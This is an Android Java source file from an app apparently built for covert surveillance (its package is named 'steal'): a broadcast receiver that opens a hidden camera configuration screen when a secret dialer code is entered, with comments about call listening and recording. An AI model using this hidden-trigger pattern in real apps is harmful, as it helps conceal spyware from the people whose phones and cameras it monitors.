package com.xiaoxin.jhang.steal.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.util.Log;

import com.xiaoxin.jhang.steal.CameraConfigActivity;
import com.xiaoxin.jhang.steal.Config;


/**
 * @author xiaoxin
 * @date 2017/4/5
 * @describe ：来电去电监听(需要开机自启)
 * 通话录音功能：VOICE_CALL：This permission is reserved for use by system components and is not available to
 * third-party applications.
 * 目前只有系统应用可以进行通话录音。
 * 修改内容
 */

public class PhoneListener extends BroadcastReceiver {

    private static final String TAG = PhoneListener.class.getSimpleName();
    public static final String SECRET_CODE_ACTION = "android.provider.Telephony.SECRET_CODE";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (action.equals(SECRET_CODE_ACTION)) {

            Uri uri = intent.getData();
            if (uri != null) {
                String host = uri.getSchemeSpecificPart().substring(2);
                Log.e(TAG, "host: "+host );
                if (Config.SECRET_CODE.equals(host)) {
                    Intent i = new Intent(context, CameraConfigActivity.class);
                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(i);
                }
            }
        }
    }

}
